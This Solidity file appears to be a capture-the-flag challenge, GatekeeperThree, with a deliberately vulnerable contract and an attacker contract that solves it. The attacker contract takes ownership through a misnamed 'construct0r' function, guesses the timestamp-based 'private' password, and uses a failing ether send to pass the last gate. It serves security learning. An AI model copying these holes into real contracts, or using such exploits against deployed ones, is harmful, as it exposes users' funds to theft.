// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }
    
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }
    
  function trickInit() public {
    trick = address(this);
  }
    
  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allow_enterance = false;
  SimpleTrick public trick;

  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner, "gateOne first");
    require(tx.origin != owner, "gateOne second");
    _;
  }

  modifier gateTwo() {
    require(allow_enterance == true, "gateTwo");
    _;
  }

  modifier gateThree() {
    if(address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
        _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allow_enterance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree returns (bool entered) {
    entrant = tx.origin;
    return true;
  }

  receive () external payable {}
}

contract GatekeeperThreeHack {
    constructor() payable {}
    function hack(address payable gatekeeperThreeAddress) external payable {
        GatekeeperThree gatekeeperThree = GatekeeperThree(gatekeeperThreeAddress);

        // pass first gate
        gatekeeperThree.construct0r();

        // pass second gate
        gatekeeperThree.createTrick();
        gatekeeperThree.getAllowance(block.timestamp);
        gatekeeperThree.getAllowance(block.timestamp);

        // pass third gate
        bool success = payable(address(gatekeeperThree)).send(0.002 ether);
        assert(success == true);

        gatekeeperThree.enter();
    }
}